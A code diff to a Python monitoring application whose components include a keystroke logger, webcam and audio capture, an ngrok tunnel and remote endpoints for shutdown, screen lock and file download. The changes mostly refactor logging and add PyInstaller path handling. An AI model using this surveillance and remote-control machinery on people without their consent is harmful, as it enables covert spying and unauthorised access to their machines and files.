@@ -58,7 +58,7 @@ CONFIG_FILE = 'monitor_config.json'
 live_monitor = None
 audio_monitor = None
 internet_monitor = None
-screenshot_taker = None
+screenshot_tracker = None
 webcam_capture = None
 keystroke_logger = None
 usb_monitor = None
@@ -66,6 +66,42 @@ app_tracker = None
 activity_tracker = None
 ngrok_tunnel = None
 app_blocker = None
+
+def get_executable_path():
+    """Get the correct path for executable files when running as .exe"""
+    if getattr(sys, 'frozen', False):
+        # Running as executable
+        base_path = sys._MEIPASS
+        return base_path
+    else:
+        # Running as Python script
+        return os.path.dirname(os.path.abspath(__file__))
+
+def get_resource_path(relative_path):
+    """Get absolute path to resource, works for dev and for PyInstaller"""
+    try:
+        # PyInstaller creates a temp folder and stores path in _MEIPASS
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    
+    return os.path.join(base_path, relative_path)
+
+def get_logs_dir():
+    """Get the logs directory path, creating it if it doesn't exist"""
+    logs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
+    if not os.path.exists(logs_dir):
+        os.makedirs(logs_dir, exist_ok=True)
+    return logs_dir
+
+def log_system_action(action):
+    """Log system control actions to the remote control log"""
+    try:
+        logs_dir = get_logs_dir()
+        with open(os.path.join(logs_dir, 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] {action}\n")
+    except Exception as e:
+        logger.error(f"Error logging system action: {str(e)}")
 
 # Monitor states
 monitor_states = {
@@ -1391,8 +1427,7 @@ def system_poweroff():
     try:
         logger.info("Remote power off command received")
         # Log the action
-        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
-            f.write(f"[{datetime.now()}] Remote power off command executed\n")
+        log_system_action("Remote power off command executed")
         
         # Execute power off command
         subprocess.run(['shutdown', '/s', '/t', '30'], shell=True)
@@ -1409,8 +1444,7 @@ def system_sleep():
     try:
         logger.info("Remote sleep command received")
         # Log the action
-        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
-            f.write(f"[{datetime.now()}] Remote sleep command executed\n")
+        log_system_action("Remote sleep command executed")
         
         # Execute sleep command
         subprocess.run(['powercfg', '/hibernate', 'off'], shell=True)  # Disable hibernate first
@@ -1428,8 +1462,7 @@ def system_logout():
     try:
         logger.info("Remote logout command received")
         # Log the action
-        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
-            f.write(f"[{datetime.now()}] Remote logout command executed\n")
+        log_system_action("Remote logout command executed")
         
         # Execute logout command
         subprocess.run(['shutdown', '/l'], shell=True)
@@ -1446,19 +1479,29 @@ def system_lock():
     try:
         logger.info("Remote lock command received")
         # Log the action
-        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
-            f.write(f"[{datetime.now()}] Remote lock command executed\n")
+        log_system_action("Remote lock command executed")
         
         # Create lock flag file for overlay to detect
-        lock_flag_file = os.path.join('logs', 'lock_system.flag')
+        logs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
+        if not os.path.exists(logs_dir):
+            os.makedirs(logs_dir, exist_ok=True)
+        
+        lock_flag_file = os.path.join(logs_dir, 'lock_system.flag')
         with open(lock_flag_file, 'w') as f:
             f.write('locked')
         
         # Start system lock overlay
         try:
-            subprocess.Popen([sys.executable, 'system_lock_overlay.py'], 
-                           creationflags=subprocess.CREATE_NO_WINDOW)
-        except:
+            # Get the correct path for the overlay script
+            overlay_script = get_resource_path('system_lock_overlay.py')
+            if os.path.exists(overlay_script):
+                subprocess.Popen([sys.executable, overlay_script], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+            else:
+                # Fallback to Windows lock
+                subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'], shell=True)
+        except Exception as e:
+            logger.error(f"Error starting lock overlay: {str(e)}")
             # Fallback to Windows lock
             subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'], shell=True)
         
@@ -1475,16 +1518,19 @@ def system_unlock():
     try:
         logger.info("Remote unlock command received")
         # Log the action
-        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
-            f.write(f"[{datetime.now()}] Remote unlock command executed\n")
+        log_system_action("Remote unlock command executed")
         
         # Create unlock flag file for overlay to detect
-        unlock_flag_file = os.path.join('logs', 'unlock_system.flag')
+        logs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
+        if not os.path.exists(logs_dir):
+            os.makedirs(logs_dir, exist_ok=True)
+        
+        unlock_flag_file = os.path.join(logs_dir, 'unlock_system.flag')
         with open(unlock_flag_file, 'w') as f:
             f.write('unlocked')
         
         # Remove lock flag
-        lock_flag_file = os.path.join('logs', 'lock_system.flag')
+        lock_flag_file = os.path.join(logs_dir, 'lock_system.flag')
         if os.path.exists(lock_flag_file):
             os.remove(lock_flag_file)
         
@@ -1819,8 +1865,7 @@ def download_file():
         
         # Log the download
         logger.info(f"Remote file download: {file_path}")
-        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
-            f.write(f"[{datetime.now()}] Remote file download: {file_path}\n")
+        log_system_action(f"Remote file download: {file_path}")
         
         return send_from_directory(
             os.path.dirname(file_path),
